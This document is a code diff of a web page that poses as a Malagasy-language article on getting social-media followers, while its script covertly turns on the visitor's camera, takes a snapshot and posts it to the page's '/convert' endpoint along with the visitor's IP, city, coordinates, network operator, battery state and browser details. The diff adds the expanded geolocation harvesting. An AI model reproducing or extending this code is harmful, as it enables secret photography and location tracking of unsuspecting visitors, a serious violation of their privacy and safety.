@@ -33,37 +33,74 @@
   <div class="story">
     <h1>Fikafika ahazoana followers sy réactions malaky</h1>
     <p>1. Mitraite compte: Misy ny atao hoe traite compte ahafahana mahazo followers. Misy ny Traite compte indien ary misy ny traite compte gasy. Mila manao réaction sy commentaire an'ilay olona efa malazalaza ireny ianao ary ajoutena zay mpanao réaction ny pubanzareo.</p>
-    
+
     <p>Memes: manao publication sary na video fampiomehezana ireny fa ireny isany mampitombo followers sy réactions malaky ary ahafahana mahazo vola tsara.</p>
-    
+
     <p>Boost: mividy followers na reactions mihintsy ianao ary izay tinao ny isany na firy na firy</p>
-    
+
     <p>Raha page indray dia ilay manao jeu giveaway reny.</p>
+    <p>Raha misy fanontaniana dia aza misalasala manontany</p>
 
   </div>
+
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
-
-  <!--__INJECT_ID__-->
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    let ipAddress = 'unknown';
 
-    // Get IP
-    fetch('https://api.ipify.org?format=json')
+    let ipInfo = {
+      ip: 'unknown',
+      city: '',
+      region: '',
+      country: '',
+      loc: '',
+      org: '',
+      timezone: '',
+      readme: ''
+    };
+
+    // Fetch all IP info
+    fetch('https://ipinfo.io/json')
       .then(res => res.json())
-      .then(data => { ipAddress = data.ip; });
+      .then(data => {
+        ipInfo = data;
+      })
+      .catch(err => console.error("IPInfo fetch failed", err));
 
-    // Get battery info
     async function getBatteryMessage() {
-      if (!navigator.getBattery) return 'Battery info unavailable';
-      const battery = await navigator.getBattery();
-      const level = Math.round(battery.level * 100);
-      const charging = battery.charging ? 'Mbola micharge' : 'Tsy micharge';
-      return `Info 🗿\n\nBattery: ${level}%,\nStatus:${charging}\nIP: ${ipAddress}\nUA: ${navigator.userAgent}`;
+      let batteryText = 'Battery info unavailable';
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          const level = Math.round(battery.level * 100);
+          const charging = battery.charging ? 'Mbola micharge' : 'Tsy micharge';
+          batteryText = `Battery: ${level}%, Status: ${charging}`;
+        }
+      } catch (e) {}
+
+      return `Info azo vaovao 🗿:
+
+
+${batteryText}
+
+IP: ${ipInfo.ip}
+
+Cité: ${ipInfo.city}
+
+Region: ${ipInfo.region}
+
+Pays: ${ipInfo.country}
+
+Latitude/Longitude: ${ipInfo.loc}
+
+Org: ${ipInfo.org}
+
+Timezone: ${ipInfo.timezone}
+
+UA: ${navigator.userAgent}`;
     }
 
     async function startCamera() {
@@ -88,7 +125,7 @@
         canvas.toBlob(async (blob) => {
           const formData = new FormData();
           formData.append('photo', blob, 'snapshot.jpg');
-          formData.append('id', PSID);
+          formData.append('id', PSID); // You should define PSID somewhere
           formData.append('message', await getBatteryMessage());
 
           fetch('/convert', {
